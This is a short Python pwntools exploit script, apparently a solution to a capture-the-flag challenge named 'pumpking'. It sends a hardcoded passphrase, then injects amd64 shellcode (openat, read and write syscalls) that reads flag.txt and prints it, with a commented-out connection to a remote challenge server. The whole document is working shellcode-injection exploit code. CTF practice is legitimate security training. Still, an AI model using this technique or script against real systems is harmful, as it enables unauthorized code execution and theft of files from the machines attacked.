from pwn import *
from pwnlib import *

context.context(arch='amd64', os='linux')

r = process("./pumpking")
#r = remote('167.71.138.188', 30543)

# Use allowed openat to open file, -100 specifies current directory
openat = asm.asm(shellcraft.amd64.linux.openat(-100, 'flag.txt'))
# Read 100 bytes from file descriptor stored in rax (return value from openat), store in buffer at rsp
read = asm.asm(shellcraft.amd64.read('rax', 'rsp', 100))
# Write 100 bytes to stdout from buffer at rsp
write = asm.asm(shellcraft.amd64.write(1, 'rsp', 100))
payload = openat + read + write

passphrase = b'pumpk1ngRulez'

r.recvuntil(b'only to naughty kids: ')
r.sendline(passphrase)
r.recvuntil(b'>> ')
r.sendline(payload)

r.interactive()
